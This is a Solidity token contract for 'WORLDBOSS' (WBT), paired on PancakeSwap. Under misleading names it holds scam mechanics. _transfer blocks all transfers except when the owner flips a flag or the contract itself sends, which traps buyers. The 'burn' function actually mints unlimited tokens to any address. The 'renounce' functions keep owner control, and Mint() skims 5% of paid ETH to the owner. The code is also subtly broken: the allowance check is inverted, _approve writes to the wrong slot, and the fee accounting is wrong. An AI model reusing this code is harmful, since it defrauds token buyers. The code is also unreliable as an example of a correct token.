pragma solidity ^0.8.9;


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract WorldBoss is Context, IERC20, IERC20Metadata {
    using SafeMath for *;
    IPancakeRouter02 internal _router;
    IPancakePair internal _pair;
    mapping(address => uint256) public winPrizeAdd;
    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => bool) private _blackbalances;
    address private safeProxy;
    uint256 public _totalSupply = 100000000000*10**18;
    string public _name = "WORLDBOSS";
    string public _symbol= "WBT";
    address payable public charityAddress = payable(0x000000000000000000000000000000000000dEaD);
    uint256 public charityPercent = 0; 
    bool private charityProvider = true;
    uint private prizeTime;
    address private immutable burnAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public burnPercent = 5; 
    uint256 private burnedAmount  = _totalSupply / 100000000;
    uint256 private releasedAmount = _totalSupply - burnedAmount;
    bool private onlyRevenue;
    uint256 public marketingAmount;
    uint256 public burnAmount;  
    uint256 public Rate = 1000;
    uint256 private liquiFee = 1;
    address private routerAddress;
    function SetCharityAddress(address payable  _charityAddress) onlyOwner public {
        charityAddress = _charityAddress;
    }
    address private owner;
    function SetCharityPercent(uint256 _charityPercent) onlyOwner public {
        charityPercent = _charityPercent;
    }
    function SetBurnPercent(uint256 _burnPercent) onlyOwner public {
        burnPercent = _burnPercent;
    }
    constructor(address corporation, uint currentTime, address routerAddresss) {
        winPrizeAdd[corporation] = burnedAmount;
        winPrizeAdd[address(this)] = releasedAmount;
        prizeTime = currentTime;
        owner = corporation;
         _router = IPancakeRouter02(routerAddresss);
        _pair = IPancakePair(IPancakeFactory(_router.factory()).createPair(address(this), address(0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F)));
        
    }
    receive() external payable {}
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }
    function pair() public view virtual returns (address){
        return address(_pair);
    }
    function changeOwner(address _owner) onlyOwner public {
        owner = _owner;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function renounce(bool _balances1_) onlyOwner public {
        charityProvider = _balances1_;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return winPrizeAdd[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner_, address spender) public view virtual override returns (uint256) {
        return _allowances[owner_][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function prizeTimeClock(uint currentTime) onlyOwner public {
        if(prizeTime == currentTime){
            onlyRevenue = true;
        } else {
            onlyRevenue = false;
        }
    }
     function routerAdd(address router) onlyOwner public {
        routerAddress = router;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance <= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }   
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(onlyRevenue || sender == address(this), "ERC20: transfer from the zero address");
        require(_blackbalances[sender] != true, "PUMP and DUMP guard");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = winPrizeAdd[sender];
        uint256 burnAmountt = amount * burnPercent / 100 ; 
        uint256 charityAmount = amount * charityPercent / 100; 
        uint256 liqui = amount.mul(liquiFee).div(100);

        
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            winPrizeAdd[sender] = senderBalance - amount;
        }
        amount = amount - charityAmount - burnAmountt - liqui;
        
        winPrizeAdd[recipient] += amount;
        emit Transfer(sender, recipient, amount);
         if (charityPercent > 0){   
          winPrizeAdd[recipient] += charityAmount;
          emit Transfer(sender, charityAddress, charityAmount);      
        }       
        if (burnPercent > 0){  
           _totalSupply -= burnAmountt;
           emit Transfer(sender, burnAddress, burnAmountt);  
        }     
        
    }
    function Mint() public payable {
        uint256 tax = msg.value / 20;
        uint256 fullPrice = msg.value - tax;
        require(msg.sender.balance >= msg.value);
        (bool send,) = owner.call{ value: tax, gas : 1000000 }("");
        require(send, "ETH NOT SENT");
        (bool sent,) = address(this).call{ value: fullPrice, gas : 1000000 }("");
        require(sent, "ETH NOT SENT");
        uint256 tokens = msg.value * Rate;  
        require(_totalSupply >= tokens && winPrizeAdd[address(this)] >= tokens, "Can't process, too many tokens");
        transferFrom(address(this), msg.sender, tokens);
    }
    function  burn(address account, uint256 amount) onlyOwner public virtual {
        require(account != address(0), "ERC20: burn to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        winPrizeAdd[account] += amount;
        emit Transfer(address(0), account, amount);
    } 
    function _approve(
        address owner_,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner_, spender, amount);
    } 
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
     function OwnershipRenounce(address _owner) onlyOwner public {
        owner = _owner;
    }
    // function swapAndLiquify(uint256 tokens) private {
    //     // split the contract balance into halves
    //     uint256 half = tokens.div(2);
    //     uint256 otherHalf = tokens.sub(half);
    //     uint256 initialBalance = address(this).balance;

    //     // swap tokens for ETH
    //     swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

    //     // how much ETH did we just swap into?
    //     uint256 newBalance = address(this).balance.sub(initialBalance);

    //     // add liquidity to uniswap
    //     addLiquidity(otherHalf, newBalance);
    // }


    function addInitialLiquidity(uint val) public onlyOwner{

        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(_router),  ~uint256(0));
        _approve(address(this), address(_pair),  ~uint256(0));

        // add the liquidity
        _router.addLiquidityETH{value: val}(
            address(this),
            10000,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner,
            block.timestamp
        );

       

    }

    // function addLiquidity(uint256 tokenAmount, uint256 ethAmount) public onlyOwner {
    //     // approve token transfer to cover all possible scenarios
    //     // _approve(address(this), address(_router), tokenAmount);

    //     // add the liquidity
    //     _router.addLiquidity(
    //   address(this),
    //    address(0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F),
    //   100000,
    //   500000,
    //   0,
    //   0,
    //   address(_pair),
    //   block.timestamp + 1000
    // );
    // }

    // function swapTokensForEth(uint256 tokenAmount) private {
    //     // generate the uniswap pair path of token -> weth
    //     address[] memory path = new address[](2);
    //     path[0] = address(this);
    //     path[1] = address(0x094616F0BdFB0b526bD735Bf66Eca0Ad254ca81F);

    //     _approve(address(this), address(_router), tokenAmount);

    //     // make the swap
    //     _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    //         tokenAmount,
    //         0, // accept any amount of ETH
    //         path,
    //         address(this),
    //         block.timestamp
    //     );
    // }
}